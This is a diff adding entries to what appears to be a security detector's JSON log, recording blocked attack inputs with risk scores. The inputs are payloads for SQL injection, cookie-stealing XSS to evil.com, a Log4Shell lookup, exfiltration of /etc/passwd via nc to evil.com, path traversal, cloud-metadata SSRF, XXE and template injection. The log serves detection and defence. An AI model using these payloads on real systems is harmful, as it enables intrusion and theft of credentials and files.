@@ -1188,5 +1188,135 @@
     "attack_type": "Brute Force",
     "reviewed": false,
     "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-04-08T23:32:40Z",
+    "text_hash": "0d3f24654ea86316c2f70fa5ef630b0e",
+    "text_snippet": "' OR '1'='1' UNION SELECT username,password FROM users--",
+    "risk_score": 0.9946185572337786,
+    "decision": "block",
+    "attack_type": "sql_injection",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-04-08T23:32:40Z",
+    "text_hash": "69c3626d1ad778d4f76aa857e6ea76ba",
+    "text_snippet": "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
+    "risk_score": 0.9944124110111368,
+    "decision": "block",
+    "attack_type": "xss",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-04-08T23:32:40Z",
+    "text_hash": "7fd61bdd9e67b067baee63892425e2b6",
+    "text_snippet": "${jndi:ldap://evil.com/a}",
+    "risk_score": 0.9999183981854003,
+    "decision": "block",
+    "attack_type": "log4shell",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-04-08T23:32:40Z",
+    "text_hash": "40ed73cb0875e476395fc3a430a436c2",
+    "text_snippet": "' OR 1=1--",
+    "risk_score": 0.9901626204226968,
+    "decision": "block",
+    "attack_type": "sql_injection",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-04-08T23:35:33Z",
+    "text_hash": "c1a3ca410d098314513fc4045e9e77dc",
+    "text_snippet": "' OR 1=1 UNION SELECT username,password FROM users--",
+    "risk_score": 0.9947431708509299,
+    "decision": "block",
+    "attack_type": "sql_injection",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-04-08T23:35:33Z",
+    "text_hash": "9b2858ba2c6fcb6e0e24f48898e977ab",
+    "text_snippet": "<script>document.location='http://evil.com?c='+document.cookie</script>",
+    "risk_score": 0.9838898672528462,
+    "decision": "block",
+    "attack_type": "xss",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-04-08T23:35:33Z",
+    "text_hash": "7fd61bdd9e67b067baee63892425e2b6",
+    "text_snippet": "${jndi:ldap://evil.com/a}",
+    "risk_score": 0.9999183981854003,
+    "decision": "block",
+    "attack_type": "log4shell",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-04-08T23:35:33Z",
+    "text_hash": "9fdaa7875b14fb9de746aeb3dcf8d8d3",
+    "text_snippet": "; cat /etc/passwd | nc evil.com 4444",
+    "risk_score": 0.9742653580193668,
+    "decision": "block",
+    "attack_type": "command_injection",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-04-08T23:35:33Z",
+    "text_hash": "d282d5d5a68f82df4971f210a0f2968b",
+    "text_snippet": "../../../../etc/passwd%00",
+    "risk_score": 0.9951428759902692,
+    "decision": "block",
+    "attack_type": "path_traversal",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-04-08T23:35:33Z",
+    "text_hash": "2ac0e8450882e7026fe16254736b901f",
+    "text_snippet": "http://169.254.169.254/latest/meta-data/",
+    "risk_score": 0.9998021025559843,
+    "decision": "block",
+    "attack_type": "ssrf",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-04-08T23:35:34Z",
+    "text_hash": "b66a8c9ba0d5fb57b6c104a708f193d1",
+    "text_snippet": "<?xml?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
+    "risk_score": 0.9875144413367231,
+    "decision": "block",
+    "attack_type": "xxe",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-04-08T23:35:34Z",
+    "text_hash": "7a176a0ec8368c98cb6b2815d54a83e0",
+    "text_snippet": "{{config.__class__.__init__.__globals__}}",
+    "risk_score": 0.7982519170974449,
+    "decision": "monitor",
+    "attack_type": "ssti",
+    "reviewed": false,
+    "promoted_to_rule": false
+  },
+  {
+    "timestamp": "2026-04-08T23:35:34Z",
+    "text_hash": "37db7d49a3eafa39c5fea3f885dd4040",
+    "text_snippet": "username=admin&password=***REDACTED***",
+    "risk_score": 0.9992113701008516,
+    "decision": "block",
+    "attack_type": "brute_force",
+    "reviewed": false,
+    "promoted_to_rule": false
   }
 ]
